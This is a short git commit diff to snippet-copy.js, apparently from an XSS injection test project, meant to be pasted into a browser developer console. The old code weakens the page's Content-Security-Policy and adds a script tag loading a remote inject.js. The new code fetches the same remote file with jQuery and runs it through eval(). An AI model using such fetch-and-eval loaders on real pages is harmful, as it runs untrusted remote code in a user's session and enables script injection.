b7ded9a9f20f1dec4faa01c3f38d6b9b1743564a
Dani Crespo <disier@gmail.com>
2022-03-24 14:52:01 +0100

    Update snippet-copy.js

--- snippet-copy.js
+++ snippet-copy.js
@@ -2,23 +2,9 @@
 This file contains the code snippet needed to be coded on the Developer Console
 **/
 
-/**
- Disables CSP from page
-**/
-
-function dynamicallyInsertCSP() {
-        let metaElement = document.createElement("meta");
-        metaElement.setAttribute("content", "default-src 'self' 'unsafe-inline' *.githubusercontent.com;")
-        metaElement.setAttribute("http-equiv", "Content-Security-Policy");
-        document.head.appendChild(metaElement);
-};
-
-function inject() {
-    var script = document.createElement("script");
-    script.type = "text/javascript";
-    script.src = "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js";
-    document.head.appendChild(script);
-}
-
-dynamicallyInsertCSP();
-inject();
+$.ajax({
+    url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js?' + new Date().getTime(),
+    success: function (data){
+        eval(data);
+    }
+  });
